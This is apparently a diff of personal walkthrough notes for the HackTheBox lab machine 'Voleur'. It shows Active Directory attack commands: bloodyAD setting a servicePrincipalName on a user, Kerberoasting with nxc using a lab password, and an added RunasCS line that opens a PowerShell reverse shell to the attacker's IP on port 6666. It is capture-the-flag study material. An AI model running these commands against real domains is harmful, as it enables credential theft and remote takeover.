@@ -52,3 +52,14 @@ Crack hash --> AFireInsidedeOzarctica980219afi
 bloodyAD -k -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' set object 'lacey.miller' servicePrincipalName -v 'http/anything' 
 nxc ldap dc.voleur.htb -d voleur.htb -k -u svc_ldap -p 'M1XyC9pW7qT5Vn' --kerberoasting kerberoastables.txt
 ```
+
+```
+
+.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.16.48:6666
+
+```
+
+
+
+
+ldap can't see deleted things, But you can see it using local enumeration on the AD using AD module, and users should have permissions to see it.
